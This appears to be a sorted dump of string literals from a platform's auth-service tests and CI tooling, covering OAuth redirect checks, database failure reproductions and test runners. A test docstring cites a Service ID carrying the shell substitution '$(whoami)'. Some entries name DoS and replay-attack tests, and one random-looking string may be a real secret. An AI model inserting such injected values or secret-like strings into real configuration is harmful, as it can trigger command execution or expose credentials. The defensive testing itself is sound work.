    "Basic Password Hashing and Verification Tests\n\nTests the core password hashing and verification functionality used throughout\nthe auth service. This ensures secure password handling for basic authentication.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Security | Goal: Auth Foundation | Impact: Core Security\n- Ensures secure password hashing for all local authentication flows  \n- Validates password verification accuracy and prevents auth bypasses\n- Critical foundation for user account security and authentication integrity\n\nTest Coverage:\n- Password hashing with different lengths and complexity\n- Password verification for correct and incorrect passwords\n- Hash format consistency and security properties\n- Password strength validation and edge cases",
    "Basic database connection test failed:",
    "Basic test setup verification\nEnsures test environment is working correctly",
    "Batch Test Fixer - Systematically fixes test failures\nProcesses tests in batches and either:\n1. Aligns tests with current code\n2. Implements missing functionality if tests are correct",
    "Batch fix known test issues and run test iterations.",
    "Batch processing completed",
    "Bearer",
    "Bearer malformed-token",
    "Bearer test",
    "Bearer test_token_123",
    "Blacklist check should return boolean",
    "Blacklisted token should be invalid",
    "Blacklisted user's refresh token should not work",
    "Blacklisting malformed token should not raise exception:",
    "Both check threads should complete",
    "Broken pipe during socket operation",
    "Build frontend for production",
    "Building frontend...",
    "Business Value Justification",
    "Business Value Test Index Generator\n\nScans the codebase to create a comprehensive index of all tests,\ncategorized by business value, customer tier, and coverage dimensions.",
    "Business value test coverage report saved to",
    "By Priority:",
    "By Type:",
    "CATEGORY STATISTICS",
    "CHANGE:",
    "CI Check for Test Stubs in Production Code\n\nThis script runs as part of the CI/CD pipeline to detect test stubs in production code.\nIt fails the build if any test stubs are found according to SPEC/no_test_stubs.xml.\n\nUsage:\n    python scripts/ci/check_test_stubs.py          # Run check and exit with code\n    python scripts/ci/check_test_stubs.py --quiet  # Minimal output for CI",
    "CI Test Stub Checker",
    "CLEANUP_TIMEOUT_SECONDS",
    "CLICKHOUSE_HOST",
    "CLICKHOUSE_PASSWORD",
    "CLICKHOUSE_URL",
    "CLOSED",
    "CLOSING",
    "COMPLETED",
    "COMPLETED:",
    "COMPLIANCE ANALYSIS",
    "COMPONENT_MAPPINGS = {\n    \"backend\": {\n        \"paths\": [\"netra_backend/tests\"],\n        \"exclude\": [\"frontend\", \"auth_service\"]\n    },\n    \"frontend\": {\n        \"paths\": [\"frontend/__tests__\"],\n        \"exclude\": []\n    },\n    \"auth\": {\n        \"paths\": [\"netra_backend/tests/auth_integration\", \"auth_service/tests\"],\n        \"exclude\": []\n    },\n    \"agents\": {\n        \"paths\": [\"netra_backend/tests/agents\"],\n        \"exclude\": []\n    },\n    \"database\": {\n        \"paths\": [\"netra_backend/tests/database\", \"netra_backend/tests/clickhouse\"],\n        \"exclude\": []\n    },\n    \"websocket\": {\n        \"paths\": [\"netra_backend/tests/websocket\", \"netra_backend/tests/ws_manager\"],\n        \"exclude\": []\n    }\n}",
    "COMPONENT_MAPPINGS\\s*=\\s*\\{[^}]+\\}",
    "COMPREHENSIVE IMPORT TEST",
    "COMPREHENSIVE TEST FIXER",
    "COMPREHENSIVE TEST IMPORT FIX REPORT",
    "COMPREHENSIVE TEST QUALITY REPORT",
    "CONNECTING",
    "CORRECT (FIX): _determine_urls()[0] + '/auth/callback' =",
    "CORS Configuration",
    "CORS configured:",
    "CORS headers not properly configured",
    "CORS test failed:",
    "CORS validation test PASSED",
    "CORS validation test failed:",
    "CORS_ORIGINS",
    "COVERAGE_ENABLED",
    "CPU Intensive:",
    "CPU Utilization:",
    "CRASHED:",
    "CREATE INDEX IF NOT EXISTS idx_auth_users_email \n                ON auth_users (email)",
    "CREATE SCHEMA IF NOT EXISTS auth",
    "CREATE TABLE IF NOT EXISTS auth_users (\n                    id VARCHAR PRIMARY KEY,\n                    email VARCHAR UNIQUE NOT NULL,\n                    created_at TIMESTAMP DEFAULT NOW()\n                )",
    "CREATE TABLE IF NOT EXISTS auth_users (\n                    id VARCHAR PRIMARY KEY,\n                    email VARCHAR UNIQUE NOT NULL,\n                    full_name VARCHAR,\n                    auth_provider VARCHAR,\n                    is_active BOOLEAN DEFAULT true,\n                    is_verified BOOLEAN DEFAULT false,\n                    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()\n                )",
    "CREATE TABLE failed",
    "CREATE TABLE failed: database \"postgres\" does not exist",
    "CRITICAL",
    "CRITICAL (must fix)",
    "CRITICAL FILES (Immediate Attention Required):",
    "CRITICAL GAPS:",
    "CRITICAL IMPORT TEST (Fast-Fail Mode)",
    "CRITICAL NOTES:\n- DO NOT add frontend URLs (app.staging.netrasystems.ai, netrasystems.ai) to redirect URIs\n- Frontend URLs will cause \"redirect_uri_mismatch\" errors  \n- Only auth service URLs should be authorized\n- Each environment needs separate OAuth application in Google Console\n- Test OAuth flow after any redirect URI changes\n\nOAUTH CONSOLE ACCESS:\n- URL: https://console.cloud.google.com/apis/credentials\n- Select appropriate GCP project for environment\n- Configure OAuth consent screen if not already done\n- Add authorized redirect URIs exactly as specified above",
    "CRITICAL OAUTH REDIRECT URI FIXES REQUIRED:\n============================================\n\nFile: auth_service/auth_core/routes/auth_routes.py\n\nLine 242: redirect_uri = _determine_urls()[1] + \"/auth/callback\"\nFix to:   redirect_uri = _determine_urls()[0] + \"/auth/callback\"\n\nLine 676: redirect_uri = _determine_urls()[1] + \"/auth/callback\"  \nFix to:   redirect_uri = _determine_urls()[0] + \"/auth/callback\"\n\nLine 906: redirect_uri = request.redirect_uri or (_determine_urls()[1] + \"/auth/callback\")\nFix to:   redirect_uri = request.redirect_uri or (_determine_urls()[0] + \"/auth/callback\")\n\nEXPLANATION:\n- _determine_urls()[0] = Auth service URL (CORRECT for OAuth redirect)\n- _determine_urls()[1] = Frontend URL (INCORRECT for OAuth redirect)\n\nIMPACT: \n- Google OAuth redirects to frontend instead of auth service\n- Auth service never receives OAuth callback\n- Frontend gets only OAuth code, not tokens  \n- Users see \"No token received\" error\n- 100% OAuth authentication failure",
    "CRITICAL OAuth redirect URI misconfiguration found - see fix details above",
    "CRITICAL OAuth redirect URI misconfiguration!\nGoogle OAuth redirect_uri:",
    "CRITICAL OAuth redirect misconfiguration detected!\nCurrent redirect_uri:",
    "CRITICAL REGRESSION: Staging OAuth using frontend URL!\nOAuth redirect:",
    "CRITICAL violations** found:",
    "CRITICAL: Coverage below 80% - focus on unit test generation for core modules",
    "CRITICAL: Found",
    "CRITICAL: OAuth redirect URI using frontend URL in",
    "CRITICAL: OAuth using prohibited frontend URL in",
    "CRITICAL: Run all tests immediately to verify nothing is broken!",
    "CRITICAL: State parameter not stored - CSRF vulnerability!",
    "CRITICAL: Test Google OAuth Console redirect URI requirements\n        \n        Validates that the redirect URIs configured in code match what should\n        be authorized in Google OAuth Console for each environment.\n        \n        If redirect URIs don't match Google Console configuration, OAuth fails.",
    "CRITICAL: Test Google OAuth initiation uses correct redirect URI in staging\n        \n        This test validates the /auth/login/google endpoint configures the correct\n        redirect_uri parameter when redirecting users to Google OAuth.\n        \n        Expected to FAIL until redirect URI configuration is fixed.",
    "CRITICAL: Test complete OAuth redirect chain to identify misconfiguration\n        \n        Simulates the complete OAuth flow to validate redirect chain:\n        1. User clicks \"Sign in with Google\" -> Frontend calls auth service\n        2. Auth service redirects to Google with redirect_uri \n        3. Google redirects back to redirect_uri (should be auth service)\n        4. Auth service processes OAuth callback\n        5. Auth service redirects to frontend with tokens\n        \n        Expected to FAIL at step 3 due to redirect_uri misconfiguration.",
    "CRITICAL: Validate auth service OAuth callback endpoint is available\n        \n        After Google OAuth, the user should be redirected to auth service callback\n        endpoint, not frontend. This test validates the endpoint exists.",
    "CSV report saved to",
    "CURRENT MISCONFIGURATION IMPACT:\n================================\n\nIF frontend URLs are configured in Google Console:\n1. Google OAuth redirects to frontend  \n2. Frontend receives OAuth code but has no way to exchange for tokens\n3. Frontend shows \"No token received\" error\n4. Users cannot complete authentication\n5. 100% OAuth flow failure\n\nIF auth service URLs are missing from Google Console:  \n1. Google OAuth returns \"redirect_uri_mismatch\" error\n2. Users see Google error page\n3. Cannot initiate OAuth flow\n4. 100% OAuth authentication blocked",
    "Cache Hit Rate:",
    "Cache Hits:",
    "Cache hit for query",
    "Cache refreshed",
    "Calculating cosine similarities...",
    "Cannot connect to PostgreSQL database",
    "Cannot connect to Redis",
    "Cannot connect to accounts.google.com",
    "Cannot find file for module:",
    "Cascade shutdown failure:",
    "Cascading failure detected",
    "Case variant",
    "Categories Executed:",
    "Categories with History:",
    "Categories with very few tests:",
    "Category '",
    "Category Results:",
    "Category failed",
    "Category:",
    "CategoryFailure",
    "Certificate expires:",
    "Certificate issuer:",
    "Certificate subject:",
    "Certificate version:",
    "Changes made:",
    "Character '",
    "Chat flow test failed:",
    "Check environment configuration",
    "Check for inter-class dependencies",
    "Check for memory leaks",
    "Check health of backend and auth services",
    "Check if a service is healthy.",
    "Check test dependencies before running",
    "Check that setup_test_path() is called before any netra_backend imports in test files.",
    "Check the error messages above for specific issues",
    "Checked",
    "Checking",
    "Checking configuration...",
    "Checking dependencies...",
    "Checking for conftest.py violations...",
    "Checking for syntax issues...",
    "Checking for test stubs in production code...",
    "Checking imports...",
    "Checking service availability...",
    "Checking tables after transaction...",
    "Circuit breaker opened for service",
    "Circular env.ACT reference found",
    "Classes:",
    "Clean up Node processes on exit (automatic on Windows)",
    "Clean up all data for a specific user",
    "Clean up excess sessions for specific user",
    "Clean up hanging test processes",
    "Clean up resources",
    "Clean up resources.",
    "Cleaning up test processes...",
    "Cleanup cancelled.",
    "Cleanup created test data",
    "Cleanup database objects",
    "Cleanup error:",
    "Cleanup operation cancelled (this should happen)",
    "Cleanup operation not responding to SIGTERM",
    "Clear cache before execution",
    "Cleared Jest cache.",
    "Cleared cache directory:",
    "Client ID format test: '",
    "Client ID matches environment",
    "Client ID:",
    "Client Secret:",
    "Client secret configured for environment",
    "Cloud Run metadata command test - Service ID:",
    "Cloud Run shutdown completed in",
    "Cloud Run shutdown timeout - cleanup exceeded",
    "Cloud Run staging not detected, got '",
    "Cloud SQL",
    "Cloud SQL Configuration",
    "Cloud SQL Connector",
    "Cloud SQL URL (should remove SSL parameters)",
    "Cloud SQL URL contains sslmode parameter",
    "Cloud SQL URL must contain /cloudsql/ path",
    "Cloud SQL URL with SSL (should remove SSL)",
    "Cloud SQL database not exist error replicated:",
    "Cloud SQL detected:",
    "Cloud SQL instance is not running or accessible",
    "Cloud SQL postgres database error replicated:",
    "Cloud SQL socket connection detected",
    "Code:",
    "Collected",
    "Command",
    "Command: python",
    "Commands",
    "Complete coordination workflow successful",
    "Complete workflow should succeed",
    "Complete workflow test failed:",
    "Complex async mocking required - tested in integration",
    "ComplexPassword@2024#WithLots$OfSpecialChars%",
    "Compliance Rate:",
    "Compliant Files:",
    "Component isolation tests (1-2min)",
    "Components:",
    "Comprehensive Fake Test Scan Results",
    "Comprehensive GitHub Workflows Testing with ACT\nTests all workflows locally to validate before pushing to GitHub",
    "Comprehensive OAuth Authorization Code Reuse Prevention Tests\n\nTests the OAuth authorization code reuse prevention mechanisms in OAuthSecurityManager.\nValidates protection against replay attacks, concurrent usage, and proper expiration handling.\n\nSecurity Goals:\n- First use of authorization code succeeds\n- Subsequent uses are blocked (reuse attack prevention)\n- Concurrent attempts are properly handled\n- Memory store fallback works when Redis unavailable\n- Codes expire after 10 minutes\n- Race conditions are prevented",
    "Comprehensive OAuth Login Test Suite - Top 30 Common Failures\nTesting Level: L3-L4 (Real services with staging environment integration)\nInitially designed to FAIL to expose real implementation issues\n\nBusiness Value Justification (BVJ):\n- Segment: All (Free, Early, Mid, Enterprise)\n- Business Goal: Security, Retention, Platform Stability\n- Value Impact: Prevents auth failures that directly impact user access and trust\n- Strategic Impact: Critical for platform reliability and user retention\n\nTest Philosophy: L3-L4 Testing\n- L3: Real SUT with real containerized dependencies (PostgreSQL, Redis, etc.)\n- L4: Real SUT deployed in staging environment with all real services\n- Minimal mocking, maximum realism",
    "Comprehensive Test Fixer - Analyzes and fixes all test failures systematically",
    "Comprehensive backend test runner for Netra AI Platform",
    "Comprehensive backend test runner for Netra AI Platform\nDesigned for easy use by Claude Code and CI/CD pipelines\nNow with test isolation support for concurrent execution",
    "Comprehensive failing tests for AuthDatabaseManager missing methods.\n\nThese tests explicitly test for the missing methods that are being called\nin auth_service/auth_core/database/connection.py but don't exist in AuthDatabaseManager.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal  \n- Business Goal: Auth service stability and reliability\n- Value Impact: Ensures critical methods exist and work correctly\n- Strategic Impact: Prevents auth service failures during database initialization",
    "Comprehensive fake test detection and reporting",
    "Comprehensive frontend test runner for Netra AI Platform",
    "Comprehensive frontend test runner for Netra AI Platform\nDesigned for easy use by Claude Code and CI/CD pipelines\nNow with test isolation support for concurrent execution",
    "Comprehensive report saved to",
    "Comprehensive script to fix all test import errors systematically.\nAnalyzes failing test files and fixes common import patterns.",
    "Comprehensive staging deployment validation script.\nTests all critical endpoints and services on staging environment.",
    "Comprehensive suffix",
    "Comprehensive system-wide tests",
    "Comprehensive test of DatabaseURLBuilder functionality and edge cases.",
    "Comprehensive test size limits validator for Netra testing system.\n\nEnforces SPEC/testing.xml requirements:\n- Test files MUST follow same 450-line limit as production code\n- Test functions MUST follow same 25-line limit as production code\n- Prevents test files from becoming unmaintainable \"ravioli code\"\n\nFeatures:\n- Scans all test files for size violations\n- Reports files exceeding 300 lines\n- Reports functions exceeding 8 lines  \n- Provides refactoring suggestions\n- Can auto-split large test files\n- Integration with test runner",
    "Computed startup order:",
    "Concurrent attack should only allow one success",
    "Concurrent validation failed:",
    "Concurrent verification failed:",
    "ConcurrentTest123!",
    "Confidence:",
    "Config",
    "Config endpoint returned",
    "Config endpoint test failed:",
    "Configuration",
    "Configuration Loading",
    "Configuration Loading Test",
    "Configuration disclosed: '",
    "Configuration error for",
    "Configuration error:",
    "Configuration failed to load",
    "Configuration fixes applied:",
    "Configuration reloaded",
    "Configuration summary:",
    "Configuration updated successfully.",
    "Configuration valid:",
    "Configuration validation failed:",
    "Configuration validation incorrectly allows 'postgres' database:",
    "Conflicts:",
    "Connected",
    "Connection Analysis:",
    "Connection Issue Analysis",
    "Connection Pooling URLs",
    "Connection Status Utils",
    "Connection aborted during cleanup",
    "Connection error",
    "Connection events failed to catch postgres database error:",
    "Connection failed",
    "Connection lost",
    "Connection pool correctly failed due to postgres database error:",
    "Connection pool disposal failed - connections still active",
    "Connection pool exhausted",
    "Connection pool exhausted, queuing request",
    "Connection pool exhaustion correctly simulated after",
    "Connection pool failed to recover after postgres database was fixed. Pool retains invalid connections and doesn't properly invalidate them.",
    "Connection pool hanging - active connections won't close",
    "Connection pool recovered after",
    "Connection pool should be exhausted after repeated postgres connection failures",
    "Connection pool usage high",
    "Connection refused",
    "Connection refused to Redis server",
    "Connection refused: Too many connections",
    "Connection reset by peer",
    "Connection timeout",
    "Connection timeout occurred",
    "Connection type:",
    "Connection type: Cloud SQL Unix Socket",
    "Connection type: TCP",
    "Consider cluster-wide CPU optimization",
    "Consistently Failing Tests:",
    "Constraint creation should handle existing constraints:",
    "Consul Health Check",
    "Container environment processing test - Service ID:",
    "Contains sslmode parameter for Cloud SQL",
    "Content-Type",
    "Content-Type mismatch:",
    "Continue anyway? (y/n):",
    "Continue testing even after failures",
    "Coordination should succeed with optional service failures",
    "Core AI optimization delivering 30-50% cost savings for",
    "Core Tests - Split from test_oauth_flows.py",
    "Core functionality unit tests",
    "CorrectPassword123",
    "CorrectPassword123!",
    "CorrectPassword124!",
    "Corrected test suite for verify_workflow_status.py\n\nTests various scenarios with proper expected behavior validation.",
    "Correctly detected credential issue:",
    "Correctly detected staging URL issue:",
    "Correctly rejected invalid Client ID '",
    "Correctly rejected malformed Service ID '",
    "Correctly rejected overly long Service ID:",
    "Cost savings of $1,200/month achieved.",
    "Could not auto-fix syntax in:",
    "Could not connect to PostgreSQL on ports 5432 or 5433",
    "Could not parse JSON results:",
    "Could not read file:",
    "Could not save report to",
    "Could not validate test file",
    "Count sessions (optionally for specific user)",
    "Count total sessions in database",
    "Count total users in database",
    "Coverage:",
    "Create OAuth test user in database",
    "Create audit log entry",
    "Create auth database session with proper table initialization",
    "Create session cleanup service",
    "Create session in database",
    "Create test session in database",
    "Create test user in database",
    "Create user in database",
    "Created",
    "Created UserFlowTestBase using unittest.TestCase",
    "Created backup directory:",
    "Created mock Agent and AgentRun models",
    "Created mock AgentRun model",
    "Created mock ClickHouseManager for tests",
    "Created mock ConversionEvent for tests",
    "Created mock Message model",
    "Created mock Team for tests",
    "Created mock Thread model",
    "Created mock database test fixtures",
    "Created mock user journey data",
    "Created split file:",
    "Created utilities file:",
    "Creating",
    "Creating TF-IDF vectors...",
    "Creating tables...",
    "Creating test session...",
    "Credential validation failed:",
    "Critical",
    "Critical - API endpoints",
    "Critical - Core functionality",
    "Critical - Database",
    "Critical - Security",
    "Critical Auth Service Database Connection Failures - Failing Tests\nTests that replicate critical database connection issues found in staging logs.\n\nCRITICAL DATABASE ISSUES TO REPLICATE:\n1. Database \"netra_staging\" does not exist - causing connection failures\n2. SSL connection failures to Cloud SQL instances  \n3. Connection timeout failures during initialization\n4. Invalid database URL construction causing connection failures\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Database reliability and connection stability\n- Value Impact: Prevents auth service failures due to database connectivity\n- Strategic Impact: Ensures authentication availability for all customer tiers",
    "Critical Auth Service ID Configuration Failures - Failing Tests\nTests that replicate Service ID configuration issues found in staging logs.\n\nCRITICAL SERVICE ID ISSUES TO REPLICATE:\n1. Service ID showing literal shell command instead of executed value (e.g. \"$(whoami)\")\n2. Environment variable substitution failures in containerized environments  \n3. Service ID containing invalid characters causing authentication failures\n4. Missing or malformed service identification in staging deployment\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Service identification and authentication reliability\n- Value Impact: Prevents service-to-service auth failures due to ID misconfiguration\n- Strategic Impact: Ensures proper service mesh authentication for enterprise deployments",
    "Critical Auth Service Staging Issues - Failing Tests\nTests that reproduce production errors found in staging environment.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Service reliability and production readiness\n- Value Impact: Prevents auth service failures in staging/production\n- Strategic Impact: Ensures authentication availability for all tiers",
    "Critical Auth Service Staging Shutdown Timeout Failures - Failing Tests\nTests that replicate specific graceful shutdown timeout issues found in staging logs.\n\nCRITICAL SHUTDOWN TIMEOUT ISSUES TO REPLICATE:\n1. SHUTDOWN_TIMEOUT_SECONDS environment variable not respected in staging\n2. Cloud Run termination signals not handled within allocated time window\n3. Database connection pools hanging during shutdown causing timeouts\n4. Redis session cleanup hanging during service termination\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal  \n- Business Goal: Service lifecycle reliability in production environments\n- Value Impact: Prevents ungraceful shutdowns that could cause data corruption\n- Strategic Impact: Ensures proper resource cleanup for enterprise scalability",
    "Critical OAuth Environment Variable Failures - Failing Tests\nTests that replicate missing OAuth environment variables found in staging logs.\n\nCRITICAL OAUTH ENVIRONMENT ISSUES TO REPLICATE:\n1. Missing OAUTH_HMAC_SECRET environment variable causing OAuth flow failures\n2. Missing or invalid GOOGLE_CLIENT_ID causing OAuth initialization failures\n3. Missing GOOGLE_CLIENT_SECRET causing OAuth token exchange failures  \n4. Invalid OAuth redirect URI configuration causing authentication errors\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: OAuth authentication reliability for user onboarding\n- Value Impact: Prevents complete authentication system failures in staging/production\n- Strategic Impact: Ensures user authentication works for all customer segments",
    "Critical OAuth Redirect URI Misconfiguration Test Suite\nTests for CRITICAL staging OAuth failure: \"No token received\" error\n\nCRITICAL ISSUE IDENTIFIED:\nAuth service tells Google to redirect to FRONTEND URL instead of AUTH SERVICE URL\n- Current: redirect_uri = _determine_urls()[1] + \"/auth/callback\" (frontend URL)  \n- Should be: redirect_uri = _determine_urls()[0] + \"/auth/callback\" (auth service URL)\n\nThis causes complete OAuth flow failure:\n1. Google never calls auth service callback endpoint  \n2. Auth service never exchanges OAuth code for tokens\n3. Frontend receives only OAuth code, not tokens\n4. User sees \"No token received\" error\n\nBusiness Value Justification (BVJ):\n- Segment: All (Free, Early, Mid, Enterprise) \n- Business Goal: Platform Stability, User Acquisition\n- Value Impact: 100% OAuth authentication failure blocks all new user registrations\n- Strategic Impact: Critical for user acquisition and revenue growth\n\n@pytest.mark.env(\"staging\") - Run in staging to catch environment-specific config issues",
    "Critical Tests (90+ score):",
    "Critical credential issues found:",
    "Critical database 'netra_dev' does not exist error replicated:",
    "Critical database 'postgres' does not exist error replicated:",
    "Critical deployment should fail",
    "Critical error after deployment",
    "Critical errors:",
    "Critical path tests that protect revenue",
    "Critical suffix",
    "Current broken frontend URL:",
    "Current pattern would fail to find GitHub client ID in staging",
    "Current revision:",
    "Current size:",
    "Custom auth exceptions not yet implemented",
    "Custom cache directory",
    "Cypress E2E:",
    "DANGEROUS: Actually perform fixes (NOT RECOMMENDED)",
    "DANGEROUS: Created",
    "DANGEROUS: Disable safe mode protections",
    "DANGEROUS: Second confirmation required for unsafe operations",
    "DANGEROUSLY fixing",
    "DANGEROUSLY split",
    "DATABASE MIGRATION TESTING FOR STAGING",
    "DATABASE SSL CERTIFICATE AND CONFIGURATION TESTING",
    "DATABASE URL BUILDER COMPREHENSIVE TESTING",
    "DATABASE_ECHO_SQL",
    "DATABASE_NAME",
    "DATABASE_URL",
    "DATABASE_URL_PLACEHOLDER",
    "DB issues in",
    "DB_NAME",
    "DEBUG",
    "DEFAULT_TEST_PATHS = [\n        \"netra_backend/tests\",\n        \"test_framework/tests\",\n        \"frontend/__tests__\",\n        \"auth_service/tests\"\n    ]",
    "DEFAULT_TEST_PATHS\\s*=\\s*\\[[^\\]]+\\]",
    "DELETE",
    "DEMO 1: TEST SIZE VALIDATOR",
    "DEMO 2: TEST REFACTORING HELPER",
    "DEMO 3: TEST RUNNER INTEGRATION",
    "DEMO 4: PROPERLY SIZED TEST EXAMPLES",
    "DEMO 5: CLI USAGE EXAMPLES",
    "DEMONSTRATION COMPLETE",
    "DEPRECATED: Use auth_db.initialize() directly instead",
    "DEPRECATED: get_test_db_config violates SSOT - use auth_db directly",
    "DEPRECATED: setup_test_database violates SSOT - use auth_db.initialize() directly",
    "DETAILED ERROR ANALYSIS (first 5 files):",
    "DETAILED REAL E2E TEST INFORMATION",
    "DETAILED REPORT",
    "DETAILED VIOLATIONS:",
    "DETECTED INVALID USER PATTERN: Found 'user_pr-4' in staging DATABASE_URL. This will cause 'password authentication failed for user user_pr-4' errors.",
    "DEV_DATABASE_URL",
    "DEV_REDIS_URL",
    "DNS resolution failed",
    "DO $$ BEGIN\n                    CREATE TYPE auth_provider_enum AS ENUM ('google', 'github', 'local');\n                EXCEPTION\n                    WHEN duplicate_object THEN null;\n                END $$;",
    "DROP",
    "DROP TABLE IF EXISTS auth_sessions CASCADE",
    "DRY RUN - No files were actually modified",
    "DRY RUN MODE - No files will be renamed",
    "DSN:",
    "DTprdt5KoQXlEG4Gh9lF",
    "Data integrity and performance for",
    "DataSubAgent Modular",
    "Database 'netra_staging' does not exist error replicated:",
    "Database Connection",
    "Database Dependent:",
    "Database Migration Commands",
    "Database Mismatch Analysis",
    "Database URL constructed:",
    "Database URL construction failed (might be expected):",
    "Database URL should not be empty",
    "Database authentication details disclosed",
    "Database check failed",
    "Database check failed but continuing in development mode",
    "Database close error:",
    "Database connection appears functional",
    "Database connection details disclosed",
    "Database connection failed",
    "Database connection hanging during Cloud Run shutdown",
    "Database connection succeeded when it should fail",
    "Database connection test should fail when netra_dev doesn't exist, but graceful degradation allows service to report healthy",
    "Database connection timeout during initialization replicated",
    "Database connectivity test failed:",
    "Database error",
    "Database information disclosed: '",
    "Database initialization #",
    "Database initialization failed with existing indexes:",
    "Database initialization failed with existing schema:",
    "Database initialization failed with existing types:",
    "Database initialization failed with unexpected error:",
    "Database initialization idempotency tests for auth service.\n\nThese tests specifically target the UniqueViolationError warnings seen in staging logs\nduring database initialization. The database initialization should be idempotent and\nhandle existing schemas, tables, and constraints gracefully.",
    "Database initialization not idempotent - got IntegrityError:",
    "Database initialization should be idempotent",
    "Database initialization should create missing tables",
    "Database initialization should handle existing constraints:",
    "Database initialization should handle existing indexes",
    "Database initialization should handle existing schemas",
    "Database initialization should handle existing types",
    "Database initialization should handle partial schema:",
    "Database initialization should recover from interruption:",
    "Database initialization should recover from partial state",
    "Database initialization should recover from previous failure",
    "Database initialization should recover from rollback:",
    "Database initialization with partial schema failed:",
    "Database initialized:",
    "Database must start before auth",
    "Database name '",
    "Database name disclosed in error",
    "Database not ready",
    "Database operations did not handle termination signals gracefully",
    "Database operations did not respond to shutdown signals within timeout",
    "Database pool hanging caused shutdown timeout:",
    "Database recovery from interruption failed:",
    "Database session manager import failed:",
    "Database session not configured",
    "Database session not setup",
    "Database should be initialized exactly once, got",
    "Database shutdown correctly timed out for broken connections",
    "Database shutdown took",
    "Database test returned status",
    "Database type detected: PostgreSQL",
    "Database user doesn't exist or password is incorrect",
    "Database-related tests",
    "Database:",
    "Database: connection failed",
    "DatabaseTestMixin",
    "DatabaseTestUtils",
    "DatabaseURLBuilder defaults to problematic 'postgres' database:",
    "DatabaseURLBuilder is creating URL with 'netra_staging' which doesn't exist:",
    "Datadog Agent/7.40.1",
    "Debug database test to verify table creation works",
    "Debug info:",
    "Default timeout not used after conversion error:",
    "Delegating fix to subagent:",
    "Demo failed with error:",
    "Demo script showing the Test Size Limits Enforcement system in action.\n\nThis demonstrates all components of Fix #2: Test Size Limits Enforcement:\n1. Test size validator functionality\n2. Test refactoring helper functionality  \n3. Integration with test runner\n4. Properly sized test examples",
    "Dependencies installed successfully",
    "Dependencies:",
    "Dependency Resolution",
    "Dependency resolution test failed:",
    "Dependency resolution working correctly",
    "Deployment errors:",
    "Deployment script configuration",
    "Description:",
    "Detail:",
    "Detailed Results:",
    "Detailed error information:",
    "Detailed report saved to:",
    "Detailed results saved to:",
    "Details",
    "Detected environment:",
    "Dev OAuth client used in staging",
    "Dev launcher exited unexpectedly",
    "Dev login not enabled",
    "Development Environment",
    "Development environment defaults to 'netra_dev' database which doesn't exist. Need to ensure development database is created or use different default.",
    "Development environment specific tests",
    "Development environment uses 'netra_dev' which may not exist:",
    "Development password in staging (should fail)",
    "Development server failed to start",
    "Development server started successfully",
    "Development server stopped",
    "Development uses localhost:8081 for auth service",
    "Dict",
    "Dict[",
    "Direct Cloud SQL async",
    "Direct Cloud SQL sync",
    "Direct cost reduction features for",
    "Direct password verification should succeed for:",
    "Direct test of staging database connection using migrated secrets.\n\n**UPDATED**: Now uses DatabaseURLBuilder for centralized URL construction.",
    "Directory",
    "Directory does not exist:",
    "Directory for storing backups (auto-generated if not specified)",
    "Directory not found:",
    "Disable automatic test splitting",
    "Disable bad test detection",
    "Disable coverage reporting",
    "Disable result caching",
    "Disconnected",
    "Discovered",
    "DoS attack caused service timeout - database error handling is vulnerable to resource exhaustion.",
    "DoS attack partially successful:",
    "DoS-Attack-",
    "Docker is not installed",
    "Docker is not running. Please start Docker first.",
    "Docker services started successfully",
    "Don't wait for services to be healthy",
    "Driver URL Formatting",
    "Duplicate database module should not exist:",
    "Duplicate test file:",
    "Duplicate test setup code has been removed.",
    "Duplicates Found:",
    "E2E COLD START TEST SUMMARY",
    "E2E Coverage:",
    "E2E Test Import Fixer\n\nAutomatically fixes imports in all moved test files after the test directory reorganization.\nUpdates imports to reflect the new test structure under tests/e2e/.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal (Development velocity protection)\n- Business Goal: Restore broken imports after test reorganization\n- Value Impact: Enables test execution after directory restructuring\n- Strategic Impact: Prevents development velocity loss due to import failures\n\nThis script:\n1. Scans test files in tests/e2e/ subdirectories\n2. Updates imports that reference old paths\n3. Fixes helper imports to use new organized structure\n4. Reports all changes made",
    "E2E Test Thread",
    "ENABLE_REAL_LLM_TESTING",
    "ENVIRONMENT",
    "ENVIRONMENT DETECTION TEST SUITE",
    "ENVIRONMENT=staging:",
    "ENV_SUFFIX",
    "ERROR",
    "ERROR:",
    "ERROR: .env.staging still exists - should be deleted!",
    "ERROR: Alembic not found (not installed?)",
    "ERROR: Cloud SQL URL should not have SSL parameters",
    "ERROR: Engine creation failed",
    "ERROR: Engine creation failed:",
    "ERROR: Expected SSL parameters but none found!",
    "ERROR: Found SSL parameters but none expected!",
    "ERROR: Invalid URL format",
    "ERROR: Invalid async URL format",
    "ERROR: Target file already exists:",
    "ERROR: Test stub check failed:",
    "ERROR: URL conversion failed:",
    "ERROR: setup_test_path() at line",
    "ERRORS:",
    "EXCEPTION (",
    "EXECUTION PLAN",
    "EXPECTED TO FAIL - CRITICAL CACHE LAYER ISSUE\n        Auth Service should continue operating when Redis cache layer is down\n        Root cause: Auth Service depends too heavily on Redis, fails when Redis is unavailable",
    "EXPECTED TO FAIL - CRITICAL DATABASE CONNECTIVITY ISSUE\n        Auth Service should handle database connectivity loss gracefully\n        Root cause: Auth Service crashes or becomes unresponsive when database is unreachable",
    "EXPECTED TO FAIL - CRITICAL GRACEFUL SHUTDOWN ISSUE\n        Auth Service should shut down gracefully, finishing in-progress requests\n        Root cause: No graceful shutdown mechanism, abrupt termination causing request failures",
    "EXPECTED TO FAIL - CRITICAL NETWORK PARTITION ISSUE\n        System should detect and handle Auth Service network partition\n        Root cause: No network partition detection or handling mechanisms",
    "EXPECTED TO FAIL - CRITICAL OAUTH PROVIDER ISSUE\n        Auth Service should handle OAuth provider connectivity loss\n        Root cause: No fallback when OAuth provider (Google, etc.) is unreachable",
    "EXPECTED TO FAIL - CRITICAL OVERLOAD ISSUE\n        Auth Service should handle request overload with proper rate limiting/circuit breaker\n        Root cause: No circuit breaker or rate limiting when Auth Service is overwhelmed",
